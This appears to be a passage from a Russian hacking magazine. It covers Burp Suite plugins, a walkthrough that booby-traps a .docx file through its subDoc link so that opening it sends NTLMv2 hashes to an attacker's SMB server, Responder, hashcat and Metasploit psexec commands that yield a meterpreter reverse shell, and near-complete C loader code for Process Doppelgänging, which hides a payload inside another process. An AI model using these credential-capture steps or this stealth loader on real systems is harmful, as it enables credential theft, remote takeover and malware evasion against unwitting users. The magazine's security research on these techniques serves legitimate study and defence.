дится в отдельном табе Bypass WAF.





                 Нас трой ка расширения Bypass WAF

После внесения изменений нуж но нажать на кнопку Set Conﬁguration.
   Чтобы плагин начал обра батывать запросы, тебе нужно перенаправить
исходящий трафик в него. Для этого на вкладке Sessions в настройках про‐
екта добавь новое правило для обработки трафика.





  Настраиваем допол нительную обра ботку трафика плагином Bypass WAF

На закладке Scope можно указать, тра фик каких утилит дол жен проходить
через Bypass WAF, и дополнитель но настро ить фильтрацию определенных
URL.





  Указываем утилиты, трафик которых должен дополнительно проходить
  через Bypass WAF

Например, я указал, что бы весь тра фик из Repeater уходил сначала в Bypass
WAF, а затем на сервер.





           Запрос, модифицированный плагином Bypass WAF


9. Burp SSL Scanner
https://github.com/PortSwigger/ssl‐scanner
   Этот плагин проверит на прочность защищенное соединение с сервером.
Здесь довольно внушительный список про верок, которые позволяют опре‐
делить типичные слабые места в протоколах SSL и TLS. Тут тебе и POODLE,
и устарев шие версии SSL, и BREACH, и ста ринный Heartbleed  (да, он
еще встречается). Полный список ты можешь найти на страничке репози‐
тория на GitHub. Поч ти все проверки были портированы с небезызвес тного
скрипта testssl.sh. Теперь не нужно отрываться от Burp, чтобы выполнить эти
тесты. Хочу отметить, что рас ширение не поддерживает протокол TLS вер‐
сии 1.3.
   У плагина есть собственный мини‐интерфейс на отдельной вкладке SSL
Scanner. Использовать его предельно прос то. Вбиваем требуемый хост
в поле Target и жмем кнопку Start Scanning.





  Вкладка плагина SSL Scanner для тестирования защищенного соеди‐
  нения

По дефолту проверяется 443‐й порт, но ничто не мешает указать кастомный
порт через двоеточие.





       Результаты сканирования сервера через плагин SSL Scanner

Ты также можешь отправлять в плагин любой URL, если из контекс тного
меняю выберешь пункт Send URL to SSL Scanner.
  Из минусов — не хватает кнопки «Оста новить ска нирование», так как оно
имеет тенденцию затягивать ся, особенно когда сервер неохотно отвечает
на запросы.


10. J2EEScan
https://github.com/portswigger/j2ee‐scan
  Напоследок парочка рас ширений для любимой Java. Первый — это оче‐
редной плагин‐старичок авторства Энрико Миланезе (Enrico Milanese). Обна‐
руживает и тестирует раз личные J2EE (Java 2 Enterprise Edition) приложе ния
на наличие известных уяз вимостей. В арсенале имеются такие старые доб‐
рые дыры, как JBoss SEAM Remote Command Execution (CVE‐2010‐1871), Ex‐
pression Language Injection  (CVE‐2011‐2730) и относительно новые вроде
Apache Struts: S2‐032 (CVE‐2016‐3081). Учитывая то, насколько сильно соп‐
ротивляются обновле ниям энтерпрайз‐решения, плагин бывает довольно
полезен и периодически выруча ет интересными находками.
  Настроек никаких не требует, допол нительной воз ни не просит. Установил
его, и он тихонько отрабатывает во время активного сканирования.





           Ин формация, обна руженная плагином J2EEScan


11. Freddy the Serial(isation) Killer
https://github.com/PortSwigger/freddy‐deserialization‐bug‐ﬁnder
  И последний плагин, о котором я хотел расска зать, — Freddy the Serial(isa‐
tion) Killer.
  В  последнее  время  ста ли  очень  популярны  всевозможные  атаки
на десереализацию и шаблонизаторы. Особенно отличились на этом поп‐
рище некоторые Java‐проекты типа Spring, WebLogic, Apache Commons.
Это расширение как раз и помога ет обна ружить проблемы десериализации
и демаршалинга в разных биб лиотеках и API.
   Здесь реализована поддержка разных форматов пей лоада, в том числе
YAML и AMF. За основу была взята ути лита marshalsec. Полный спи сок под‐
держиваемых целей ты можешь посмотреть на странице репозитория. Хочу
также отметить, что, помимо Java, плагин умеет ата ковать десериализаторы
.NET, такие как FastJson, JavascriptSerializer, XmlSerializer.
  Работает «Фредди» во время автоматического сканирования. Никак
дополнительно настраивать его не требует ся, а все найденные уязвимости
можно посмотреть в панели Issues.


ИТОГ
Разумеется, это лишь часть плагинов, которые я использую в повседневной
работе. Я не упо минал тут о небольших пла гинах‐хелперах типа JSONBeautiﬁ‐
er и Swagger Parser, плагине Burp WP, который использует базу данных WP‐
Scan для определе ния уяз вимых тем и плагинов в WordPress, и семей стве
плагинов Copy As, которые позволяют копировать запрос в виде кода на выб‐
ранном языке.
  Я постарался рассказать о наибо лее удачных, по моему мнению, рас‐
ширениях. Думаю, у каждого собрался такой вот списочек. Поэтому, если
тебе есть что добавить, пиши в коммента риях.
ВЗЛОМ



СОЗДАЕМ ДОКУМЕНТ
С СЮРПРИЗОМ
ДЛЯ ПЕРЕХВАТА ХЕША
NTLMV2‐SSP
И БРУТИМ ПАРОЛЬ





       Роман Вегелин
         vegelin47@mail.ru


PASS THE HASH
     OPEN XMLЧЕРЕЗ




Хакеры давно используют документы MS Oﬃce как кон тей‐
неры для дос тавки пейлоада. Одна ко написание макросов
и поиск  уязвимостей в самих офисных программах —
не единственные способы заставить их работать так, как нам
нужно. В этой статье мы рассмотрим нетривиаль ный прием,
заставляющий атакуемый компьютер c Windows передать
нам по сети учетные дан ные пользователя при открытии
файла .docx.


SMB
SMB — это сетевой протокол, который служит в основном для доступа к дан‐
ным на удаленном компь ютере. Говоря проще, ког да ты пытаешься залезть
на шару, то как раз им и пользуешь ся. Выпущен он был в далеком 1983 году,
но лишь со времен Windows 2000 стал походить на тот, каким мы его знаем
сейчас (например, работать на 445‐м порте).
  Сейчас есть три основные версии протоко ла. Сущес твенная разница зак‐
лючается в командах, пропус кной спо соб ности (за счет раз ных вариантов
кеширования) и обновлении безопас ности (шифрование и заплатки дыр).
Плюс разработчики не упускают возможности сделать работу с SMB более
удобной, поэтому с каждым релизом в него добавляются разные плюхи (нап‐
ример, восстановление соединения при разрыве).
  В рамках данной статьи мы рассматрива ем конкретно SMBv2. Нам необ‐
ходимо знать, что существу ет механизм защиты Microsoft SMB Protocol. Он
основан на двух методах контроля дос тупа: share‐level и user‐level.
  Для предоставления доступа методом share‐level необходимо иметь соот‐
ветствующий логин и пароль. Пос ле успешной аутентификации пользователь
получает доступ ко всем данным, которые находят ся на ресурсе.
  Метод user‐level также берет за основу логин и пароль. Отличие заключа‐
ется в том, что в этом случае системный админис тра тор задает список дос‐
тупа, то есть явно указывает, каким пользователям и группам предоставить
доступ к ресурсу. Нам интересен и тот и дру гой метод, так как в обоих случаях
способ аутентификации оста ется неизменным — NTLMv2.


           WARNING

                      Вся информация в этой статье предоставлена
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный дан ными материала ми!



NTLMV2
Нас интересует именно NTLMv2, так как SMBv2, который мы будем рассмат‐
ривать, использует его. Эта вер сия протокола сетевой аутентификации
появилась во времена Windows NT 4.0 SP4 и с небольшими изменени ями
дожила до наших дней в сос таве Windows 10. В NTLMv2 используется одно‐
именный тип рукопожатий (NTLMv2 handshake), считающийся более безопас‐
ным, чем устаревшие LM и NTLM первой версии.
  Работает все следующим обра зом. При открытии документа со ссылкой
на сетевую шару клиент (которым в нашем слу чае будет компьютер жертвы)
передает этому серверу команду на получение контента. Для этого он отсы‐
лает ему имя поль зователя и имя домена, на что сервер запускает процедуру
авторизации по типу «зап рос/ответ».
  Он отправляет клиенту однократно используемое рандомное чис ло —
server nonce. В ответ клиент отсылает новый запрос, который содержит
другое псевдослучайное число — client nonce и метку времени.
  Запросы клиента и сервера объединяются в общий секрет (session nonce),
из  которого  на  стороне  сервера  вычисляется  хеш  сессии  HMAC‐
MD5 или HMAC‐SHA‐256 (в зависимости от версии SMB и нас троек безопас‐
ности).
  На стороне клиента хеш сес сии шифруется тремя ключами DES, генери‐
руемыми из допол ненно го нулями и разделенного на три блока NT‐хеша
пользовательско го пароля. Это и есть итоговый NTLMv2‐ответ, который
отправляется серверу.
  Сервер объединяет NTLMv2‐ответ со своим зап росом и вычисляет от него
новый хеш HMAC‐MD5 или HMAC‐SHA‐256.
  На финальном этапе контроллер домена получа ет хешированный NTLMv2‐
ответ вместе с запросами клиента и сервера. Он считывает из своей базы
NT‐хеш пользовательского пароля и расшифровывает полученный клиент‐
ский ответ. Если удачно — серверу возвращает ся ответ об успешной аутен‐
тификации.
                                                                             128  Поясню для заядлых брутфорсеров: мно жес тво хешей NT составля ет 2
(или более 340 тысяч дециллионов) вариантов. Средняя скорость брутфорса
пар NTLM‐хеш — пароль на компе с Core i7 и топовой виде окартой уровня
GTX1080 составляет порядка 700 миллионов в секунду (зависит от прог‐
раммы и особенностей конфигурации). Поиск по радужным таблицам на нем
же выполняется гораздо быс трее — на скорос ти около 100 000 миллионов
в секунду.


Воп рос к читате лю
Как ты думаешь, сколь ко времени пот ребуется на брутфорс пароля по NTLM‐
хешу при стандартном матема тическом ожи дании 50% (то есть когда пароль
отыскивается в первой половине множес тва перебираемых вари антов)?
  Ответ для ленивых: комп сгорит быстрее.



ОПИСАНИЕ УЯЗВИМОСТИ
В конкретном примере рассмат ривается частный случай атаки Pass the Hash,
подробности о которой читай во врезке. Атаковать мы будем с помощью Of‐
ﬁce Open XML. Это формат хранения офисных документов, и представляет он
собой не что иное, как обычный ZIP‐архив, в который упакованы текст, гра‐
фика и остальные данные. Нам необходимо заставить документ обратиться
к удаленному (естественно, подконтрольному нам) SMB‐серверу, перех‐
ватить трафик и выудить отту да хешированные учетные данные. Для этого
воспользуемся возможностью данного формата встраивать в тело документа
текст из другого документа (субдокумента).
  В частности, в MS Oﬃce имеется функция под названи ем subDoc,
о которой и пойдет речь. Сама функция ничего особо злого в себе не несет,
так как предназначена она для динамичес кого обновления контента.
  К примеру, возьмем два файла: doc1 и doc2. Вставим при помощи фун‐
кции subDoc текст из doc1 в doc2. Изменим текст в doc1. Теперь при откры‐
тии файла doc2 он обратит ся к источнику текста и внесет те же самые изме‐
нения, а точнее — просто обновит содержимое.
  Фокус в том, что мы можем модернизировать файл doc2 таким образом,
чтобы он ссылался на файл на удален ном сервере (неважно, в локальной
сети это будет или за NAT). На этот раз, открывая doc2, Word обратится
по SMB‐протоколу за содержимым, что позволит нам перехватить трафик
и достать оттуда необ ходимые нам данные. Если файл будет недоступен, то
документ просто не сможет обновиться.
  Делать мы будем так, чтобы ссылка была вообще не на файл, а прос то
на сервер по SMB. На том конце, естественно, кто‐то встре тит нужные пакеты
и получит заветный логин (в открытом виде) и NTLMv2‐ответ (с которым в ито‐
ге и нужно развле каться). При этом на стороне ата куемого не будет никакой
подозрительной активнос ти. Он прос то открывает файл.


Pass the Hash
Суть атаки передачи хеша состоит в том, чтобы вынудить атакуемый компь‐
ютер отправить на сетевой узел, подконтрольный хакеру, запрос, содер‐
жащий хешированный пароль текущего пользователя. В данной статье рас‐
сматривается вариант с использованием ссылки на общий сетевой ресурс
в «злонаме ренно составленном» документе формата Oﬃce Open XML.
При открытии файла авто матически выполнится попыт ка авторизации по SMB
без Session Security Flag, для чего отпра вится стандартный запрос, содер‐
жащий зашифрованный NTLM‐хеш пароля.
  Разумеется, это справедливо только в том слу чае, если на компьютере
жертвы используется SMB‐NTLM. Если корпоративная сеть мигрирует на Ker‐
beros, изменится система «запрос/ответ». В ней появится промежуточный
сервер, поэтому таким спо собом хеш перехватить уже не удастся. Подробнее
см. доклад c конференции Black Hat.



ПОДГОТОВКА
Для реализации описанной выше теории нам необходимы четыре вещи:
 1. Лю бая Linux‐машина (какой уж взлом без линуксов‐то…).
 2. Пакет Microsoft Word, начиная с 2007.
 3. Прямые руки.
 4. Компьютер жертвы или его имитация.

В эксперименте я исполь зовал следующие программы:
 • Ubuntu Server 16.04;
 • MS Windows 7 Ultimate (сборка 7600);
 • пакет MS Oﬃce 2010, стандартное издание.

Помимо Windows 7, успешные испытания были проведены на Windows Server
2012 R2, версия 6.3, билд 9600.


СОЗДАЕМ ВРЕДОНОСНЫЙ ФАЙЛ
На GitHub уже выложен инстру мент под названием Subdoc Injector, который
позволяет одной командой создать вредоносный документ. Его можно ска‐
чать и опробовать, но нас тоящие герои всегда идут в обход.
  Создаем два файла .doc (doc1 и doc2). В документ doc1 пишем любой
текст, сохраняем его и закрываем. Затем открываем doc2. На при мере MS
Word 2007: открываем вкладку «Вставка» и выбираем «Объект → Объект».





                        Вставка суб документа

В открывшемся окне переходим на вкладку «Создание из фай ла». Заполняем
поле «Имя файла», указывая на doc1. Обязательно устанавливаем флаг
«Связь с файлом».
  После этого в теле документа появится вставка в виде текста из doc1.
Не забываем сох ранить и закрыть.
  Пока все легко и просто. Следующим шагом нам предстоит исследовать
глубины структуры документа. «Разобрать» его можно разными способами —
это обычный ZIP, поддержка которого изна чаль но есть в Windows. Кому‐то
по душе внешние архиваторы, кто‐то предпочитает файловые менеджеры
с архивными плагинами — у каждого свои преимущества. Я для удобс тва
использовал WinRAR.
   Итак, открываем документ выбранным способом и идем в папку word\
_rels. Нас интересует файл .rels. Распаковываем его из архива и откры ваем
с помощью «Блокнота». Самая интересная часть — это ссылка на файл.





                  Ссылка, которую будем менять

Ее необходимо отредактировать таким образом, чтобы она имела вид Tar‐
get=///IP, где IP — это адрес нашего сервера с запущенным Responder.
  Затем сохраняем и закрываем «Блокнот». Упа ковываем _rels на свое мес‐
то, заменив им старую версию. На этом этапе подготовка закончена, перехо‐
дим к атаке.


ПЕРЕХВАТЫВАЕМ УЧЕТНЫЕ ЗАПИСИ
Нам необходимо иметь уста новленный Linux (если действия будут проходить
за пределами локальной сети, то у нее должен быть белый IP‐адрес). Я под‐
нял для теста серверный дистрибутив Ubuntu и кло нировал ветку Responder
с GitHub. Этот инструмент умеет слушать разные протоколы и выужи вать
из запросов учетные данные.


git clone https://github.com/SpiderLabs/Responder

В папке Responder открываем в удобном нам редакторе Responder.conf
и включаем SMB.
  После этого, предварительно пос мотрев IP нашего сервера, запускаем
новоиспеченный пакет. Запуск необ ходимо проводить от root. Пос ле ключа –
I должно идти название сетевого интерфейса, который будет принимать
пакеты.


sudo ./Responder –I eth0

В выводе необходимо, чтобы SMB server был в статусе ON.





                       Запуск Responder

На этом подготовка нашего «перехватчика» завершена.
  После того как мы закинем doc2 на компь ютер жертвы и дождемся его
открытия, он покажет пользователю свое содержимое, как обычный документ,
ни о чем не пре дупредив. Пользователь увидит в нем текст, изначально сох‐
раненный из doc1. По идее, ког да Word не может установить связь с файлом,
он должен выдать ссылку на него в теле документа, но на практике этого
не делает. Подозрение может вызвать разве что необычная вставка текста.
  Тем временем на стороне нашего сервера произошли изменения.





                    Перехваченные данные

Тут все ясно: мы перехватили часть учетных данных (имя пользователя
и домен) в открытом виде и NTLMv2‐SSP‐хеш, который предстоит взломать.
Плюсом нам выдан IP‐адрес жертвы, а это тоже кое‐что.


БРУТ ПАРОЛЯ
Для получения пароля в чистом виде придется ата ковать NTLMv2‐SSP‐хеш.
Эффективнее использовать перебор по радужным таблицам или атаку
по словарю, посколь ку брутфорс может затянуть ся на годы, но для коротких
несловарных паролей и он сгодит ся.
  Для начала забираем перехваченную информацию с нашего сервера.
Можно через SSH под линукс или вос пользовать ся старым добрым WinSCP
для Windows. Необ ходимый log‐файл будет лежать в каталоге Responder/logs
с именем SMB‐NTLMv2‐SSP‐IP.txt (очень даже символично).
  Далее можно воспользоваться программой HashCat. Команда будет выг‐
лядеть следующим образом:


hashcat –m 5600 [NTLMv2] –a 3 –status –o [file]

Вместо NTLMv2 необ ходимо подставить NTLMv2‐ответ, содержащий зашиф‐
рованный хеш перехваченного пароля. Вместо ﬁle — файл, в который будет
записываться статистика и (если повезет) найденный пароль.
   Программа, в соот ветствии с внесенными данными, сама подберет маску
для брута.





                    Запуск программы HashCat


METASPLOIT
Если тебе не нравится медитировать во время перебора паролей, на помощь
придет старый доб рый Metasploit Framework. У него уже из коробки есть экс‐
плоит для PsExec (упрощенный вариант Telnet).
  Запустим Metasploit и выберем экспло ит.


use  exploit/windows/smb/psexec

Следом добавим «полезную нагрузку».


set payload windows/meterpreter/reverse_tcp

Смотрим таблицу данных, которые надо дать программе.





              Опции, которые необ ходимо изменить

Нам нужно передать параметры: RHOST (IP‐адрес компьютера жертвы), SMB‐
Pass (пароль или его хеш), SMBUser (имя поль зовате ля из перехваченных
учетных данных), LHOST (IP‐адрес нашего компь ютера с Metasploit Frame‐
work). Запускаем  экспло ит, ловим сес сию метерпретера и улыбаемся
во все 32 (зуба, не бита)!


ЗАКЛЮЧЕНИЕ
Все мои попытки запретить обра щение функции к «субдокументу» средства‐
ми безопасности Word закончились провалом: не помогает даже запрет
на редактирование и отключение ненадежных документов. Более того, любая
программа, которая понимает Oﬃce Open XML, смо жет при откры тии обра‐
титься к SMB‐серверу, со всеми вытекающими учетными данными (в прямом
смысле этого выражения).
   Эта функция, как ни странно, не была пуб лично признана как вредонос ная.
Поэтому на момент написа ния статьи такой файл не детектиру ется как потен‐
циально опасный ни одним антивиру сом.
  В  Microsoft  также не пла нировали предпринимать никаких действий
по этому поводу. В итоге мы получа ем очень легкий в реализации (практичес‐
ки в три клика) способ похитить учет ные данные, что совсем не весело.
  Самый верный способ защиты — это закрыть или отключить SMB, если
в нем нет необходимости. Однако при этом ты потеряешь це лый набор сов‐
ременных  сетевых  функций. Против  данной  атаки  будет  эффективен
и переход на аутентифика цию Kerberos.


        WWW

                     •Настройка SMB в Windows
                    •Используем хеш для авто ризации
                       •Pass the Hash и PsExec
ВЗЛОМ



 ЗЛОЙ ДВОЙНИК
 АТАКУЕТ!
    МАСКИРУЕМ ЗАПУСК ПРОЦЕССОВ
           ПРИ ПОМОЩИ
      PROCESS DOPPELGÄNGING





На конференции Black Hat Europe 2017 был
представлен доклад о новой тех нике запус‐
ка процессов под названием Process Dop‐
pelgänging. Вирмейкеры быстро взяли эту
технику на вооружение, и уже есть несколь‐              Nik Zerof                                                                                              xtahi0nix@gmail.com
ко вариантов малвари, которая ее эксплу‐
атирует. Я рас скажу, в чем суть Process
Doppelgänging  и  на  какие  системные
механизмы он опирается. Заодно напишем
небольшой загрузчик, который демонстри‐
рует запуск одного процесса под видом
другого.


Техника Process Doppelgänging чем‐то похожа на сво его пред шес твенника —
Process Hollowing, но отличается механизмами запуска приложения и взаимо‐
действия с загрузчиком операционной системы. Кроме того, в новой технике
применяются механизм транзакций NTFS и соот ветс твующие WinAPI, нап‐
ример  CreateTransaction,  CommitTransaction,  CreateFileTransacted
и RollbackTransaction, которые, разумеется, не используются в Process
Hollowing.
   Это одновре менно сильная и слабая черта новой техники сокрытия про‐
цессов. С одной стороны, раз работчики антивиру сов и прочего защитного
софта не были готовы к тому, что для запуска вредоносного кода будут
использованы WinAPI, отвечающие за транзакции NTFS. С другой стороны,
после доклада на конференции эти WinAPI сразу попадут под подозрение,
если будут встречаться в исполня емом коде. И неудивительно: это редкие
системные вызовы, которые практичес ки не применяются в обычных прог‐
раммах. Конечно, есть несколько спо собов скрыть вызовы WinAPI, но это уже
другая история, а сейчас мы имеем неп лохой концепт, который можно раз‐
вивать.


РАЗЛИЧИЯ PROCESS DOPPELGДNGING И PROCESS HOLLOWING
Широко распространенная в узких кру гах техника запуска исполняемого кода
Process Hollowing заключается в подмене кода приостановленного легитим‐
ного процесса вредоносным кодом и пос ледующем его выполнении. Вот
общий план действий при Process Hollowing.
 1. При помощи CreateProcess открыть легитимный доверенный процесс,
   установив флаг CREATE_SUSPENDED, чтобы процесс приостановился.
 2. Скрыть  отображение  секции  в  адресном  пространстве  процесса
   при помощи NtUnmapViewOfSection .
 3. Перезаписать код нужным при помощи WriteProcessMemory.
 4. Запуститься при помощи ResumeThread.

По сути, мы вручную меня ем работу загрузчика опе раци онной системы
и делаем за него часть работы, попутно подменяя код в памяти.
  В свою очередь, для реализации техники Process Doppelgänging нам нуж‐
но выполнить такие шаги.
 1. Создаем новую транзакцию NTFS при помощи функции CreateTransac
  tion.
 2. В контексте транзакции соз даем временный файл для нашего кода фун‐
   кцией CreateFileTransacted .
 3. Создаем в памяти буферы для временного файла (объ ект «секция», фун‐
   кция NtCreateSection).
 4. Проверяем PEB.
 5. Запускаем про цесс через NtCreateProcessEx>ResumeThread.

Вообще, технология транзакций NTFS(TxF) появи лась в Windows Vista на уров‐
не драйвера NTFS и осталась во всех последу ющих операционных сис темах
этого семей ства. Эта технология призвана помочь производить различные
операции в файловой системе NTFS. Также она иногда используется
при работе с базами данных.
  Операции TxF считаются ато марными — пока происходит работа с тран‐
закцией (и связанными с ней файлами), до ее закрытия или отката она
не видна никому. И если будет откат, то операция не изменит ничего на жес‐
тком диске. Транзакцию можно создать при помощи функции CreateTrans‐
action с нулевыми параметрами, а пос ледний параметр — название тран‐
закции. Прототип выглядит таким образом.


HANDLE CreateTransaction(
    IN LPSECURITY_ATTRIBUTES lpTransactionAttributes OPTIONAL,
    IN LPGUID UOW                                    OPTIONAL,
    IN DWORD CreateOptions                           OPTIONAL,
    IN DWORD IsolationLevel                          OPTIONAL,
    IN DWORD IsolationFlags                          OPTIONAL,
    IN DWORD Timeout                                 OPTIONAL,
    LPWSTR                                           Description
);


ПРИСТУПАЕМ К РАБОТЕ
Начинаем писать приложение с самого начала. Условимся, что наше при‐
ложение (пейлоад), которое необходимо будет запустить от имени другого
приложения  (цели), будет передаваться в качес тве второго аргу мента,
а цель — в качестве первого.

Как поль зовать ся недоку мен тирован ными NTAPI
В коде мы будем использовать недоку ментированные функции NTAPI Win‐
dows. Они получаются динамически по своему про тотипу. Вот один из воз‐
можных методов получения недоку ментированных функций и работы с ними.
  Объявляем прототип функции NtQueryInformationProcess:


 typedef NTSTATUS(WINAPI *NtQueryInformationProcess)(HANDLE,
         UINT,
         PVOID,
         ULONG,
         PULONG);


На лету получаем адрес нуж ной функции в биб лиотеке ntdll.dll по ее име ни
при помощи GetProcAddress и присваиваем его переменной нашего про‐
тотипа:


 pNtQueryInformationProcess NtQueryInfoProcess = (pNtQueryInforma
 tionProcess) GetProcAddress(
     LoadLibrary(L"ntdll.dll"),
     "NtQueryInformationProcess"
 );


Здесь используем функцию NtQueryInformationProcess обычным образом,
только через нашу переменную:


 NTSTATUS Status = pNtQueryInfoProcess(...);
 if (Status == 0x00000000) return 0;


Так получаются и исполь зуются все необ ходимые недокументированные фун‐
кции, которые обыч но выносят в header проекта.



int main(int argc, char *argv[]) {
    WCHAR descr[MAX_PATH] = { 0 };
    HANDLE hTrans = CreateTransaction(NULL,
            0,
    0,
    0,
    0,
    0,
    descr);
    if (hTrans == INVALID_HANDLE_VALUE)
        return ‐1;

Далее создаем фик тивный временный файл в контексте транзакции.


HANDLE hTrans_file = CreateFileTransacted(dummy_file,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTrans,
        NULL,
        NULL);
if (hTrans_file == INVALID_HANDLE_VALUE)
    return ‐1;

В переменной dummy_file — путь к тому файлу, под который мы маскиру‐
емся. Я буду стараться всегда приводить прототи пы недокументированных
функций: вот прототип CreateFileTransacted.


HANDLE CreateFileTransactedA(
    LPCSTR                lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile,
    HANDLE                hTransaction,
    PUSHORT               pusMiniVersion,
    PVOID                 lpExtendedParameter
);

Далее необходимо выделить память для нашего пейлоада. Это можно сде‐
лать при помощи маппинга, а можно и обычным вызовом malloc.


HANDLE input_payload = CreateFile(argv[2],
        GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
if (input_payload == INVALID_HANDLE_VALUE)
    return ‐1;
BOOL status = GetFileSizeEx(input_payload, &pf_size);
if (!status) return ‐1;
DWORD dwf_size = pf_size.LowPart;
BYTE *buf = (BYTE *)malloc(dwf_size);
if (!buf) return ‐1;

Думаю, что этот код не вызовет у тебя никаких трудностей: здесь используют‐
ся стандартные функции WinAPI и функции языка С.
   Итак, буфер в памяти готов, теперь запол ним его.


DWORD read_bytes = 0;
DWORD overwrote = 0;
if (ReadFile(input_payload, buf, dwf_size, &read_bytes, NULL) == FALSE)
    return ‐1;
if (WriteFile(hTransactedFile, buf, dwf_size, &overwrote, NULL) == FALSE)
    return ‐1;
status = NtCreateSection(&hSection_obj,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hTrans_file);
if (!NT_SUCCESS(status))
    return ‐1;

С этого момента в памяти все готово: буфер выделен и заполнен нашим пей‐
лоадом. Теперь дело за малым — создать процесс, нас троить PEB, вычис‐
лить точку входа и запус титься в новом треде. :) Соз давать процесс функцией
CreateProcess мы не можем: ей нужен путь до файла, а если учесть, что
файл, который мы создали внутри транзакции, — фейковый, к тому же тран‐
закция даже не завершена (и никогда не будет завершена, будет рол лбэк), то
такой путь мы предоставить не в состоянии. Но выход есть — использовать
функцию NTAPI NtCreateProcessEx. Ей не нужен путь к файлу, вот ее про‐
тотип:


NTSTATUS
NTAPI
NtCreateProcessEx(
  _Out_     PHANDLE ProcessHandle,
  _In_    ACCESS_MASK DesiredAccess,
  _In_opt_  POBJECT_ATTRIBUTES ObjectAttributes,
  _In_    HANDLE ParentProcess,
  _In_    ULONG Flags,
  _In_opt_  HANDLE SectionHandle,
  _In_opt_  HANDLE DebugPort,
  _In_opt_  HANDLE ExceptionPort,
  _In_    ULONG JobMemberLevel
);

Передаваемый в эту функцию параметр SectionHandle не что иное, как сек‐
ция, которую мы создали функцией NtCreateSection.


status = NtCreateProcessEx(&h_proc,
        GENERIC_ALL,
        NULL,
        GetCurrentProcess(),
        PS_INHERIT_HANDLES,
        hSection_obj,
        NULL,
        NULL,
        FALSE);
if (!NT_SUCCESS(status))
    return ‐1;

Тут магия заканчивается и начинается рутина. Если ты когда‐нибудь писал
процедуру запуска процессов из памяти при помощи NtCreateProcessEx, то
будет легко. Сначала заполним RTL_USER_PROCESS_PARAMETERS и запишем
эти данные в наш процесс.


UNICODE_STRING  victim_path;
PRTL_USER_PROCESS_PARAMETERS proc_parameters = 0;
status = RtlCreateProcessParametersEx(&proc_parameters,
        &victim_path,
        NULL,
        NULL,
        &victim_path,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED);
if (!NT_SUCCESS(status))
    return ‐1;
LPVOID r_proc_parameters;
r_proc_parameters = VirtualAllocEx(h_proc, proc_parameters,
        (ULONGLONG)proc_parameters & 0xffff + proc_parameters‐>Enviro
nmentSize + proc_parameters‐>MaximumLength,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);
if (!r_proc_parameters)
    return ‐1;
status = WriteProcessMemory(h_proc,
        proc_parameters,
        proc_parameters,
        proc_parameters‐>EnvironmentSize + proc_parameters‐>MaximumLength,
        NULL);
if (!NT_SUCCESS(status))
    return ‐1;

Далее так же, при помощи WriteProcessMemory, настраиваем PEB.


PROCESS_BASIC_INFORMATION pb_info;
status = NtQueryInformationProcess(
        h_proc,
        ProcessBasicInformation,
        &pb_info,
        sizeof(pb_info),
        0);
if (!NT_SUCCESS(status))
    return ‐1;
PEB *peb = pb_info.PebBaseAddress;
status = WriteProcessMemory(h_proc,
        &peb‐>ProcessParameters,
        &proc_parameters,
        sizeof(LPVOID),
        NULL);
if (!NT_SUCCESS(status))
    return ‐1;

И последний, завершающий штрих — запуск треда процес са. Для этого нуж‐
но узнать базовый адрес загрузки модуля и начало кода в выделенном нами
буфере. Код стандартный, упрощенный.


PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)buf;
PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(buf + dos_header‐>
e_lfanew);
ULONGLONG ep_proc = nt_header‐>OptionalHeader.AddressOfEntryPoint;
GetSystemInfo(&sys_info);
LPVOID base_addr = 0;
while (p_memory < sys_info.lpMaximumApplicationAddress) {
    VirtualQueryEx(h_proc,
            p_memory,
            &mem_basic_info,
            sizeof(MEMORY_BASIC_INFORMATION));
    GetMappedFileName(h_proc,
            mem_basic_info.BaseAddress,
            mod_name,
            MAX_PATH);
    if (strstr(mod_name, argv[1]))
        base_addr = mem_basic_info.BaseAddress;
    p_memory = (LPVOID)((ULONGLONG)mem_basic_info.BaseAddress + (ULONGLONG)
mem_basic_info.RegionSize);
}
ep_proc += (ULONGLONG)base_addr;

И запускаем сам поток:


HANDLE hThread;
status = NtCreateThreadEx(&hThread,
        GENERIC_ALL,
        NULL,
        h_proc,
        (LPTHREAD_START_ROUTINE)ep_proc,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL);
if (!NT_SUCCESS(status))
    return ‐1;

Вот и все. С этого момента наш код начинает работать под прикрытием дру‐
гого процесса. Не забыва ем сделать роллбэк транзакции:


if (!RollbackTransaction(hTrans)) return ‐1;


ЗАКЛЮЧЕНИЕ
Как видишь, ничего сложного в этой новой атаке нет. Из бонусов — атака
получается бесфайловой, весь код сущес твует только в памяти, потому что
мы не завершаем транзакцию NTFS, а откатываем все изменения.
  Подобный метод внедрения нес ложно обнаружить — нужно просто срав‐
нить код в памяти и на жес тком диске. Кро ме того, некоторые NTAPI, исполь‐
званные в статье, имеют высокий рейтинг у эвристиков антивирусов (нап‐
ример, та же NtCreateThreadEx). Подозрения у антивирусов может выз вать
и сам факт использования редких функций WinAPI, которые отвечают за тран‐
закции NTFS, особенно в свете того, что в Microsoft не рекомендуют их
использовать. Конеч но, это не означает, что эвристи ка обязательно сработа‐
ет, но точно заставит присмотреть ся к тво ему файлу с сильной предвзя‐
тостью.
  Замечу, что приведенный мной код — это концепт, который еще улучшать
и улучшать. Например, можно использовать маппинг для выделения буферов,
можно зашифровать динамическое получение функций и так далее.
ВЗЛОМ

    ОПАСНЫЙ
PHAR





            ЭКСПЛУАТИРУЕМ ПРОБЛЕМЫ
           ДЕСЕРИАЛИЗАЦИИ В PHP
            НА ПРИМЕРЕ УЯЗВИМОСТИ
                aLLy               ONsec    В WORDPRESS
               @iamsecurity



В этой статье мы поговорим об осо бенностях уязвимостей
десериализации данных в PHP, причем не простых, а реали‐
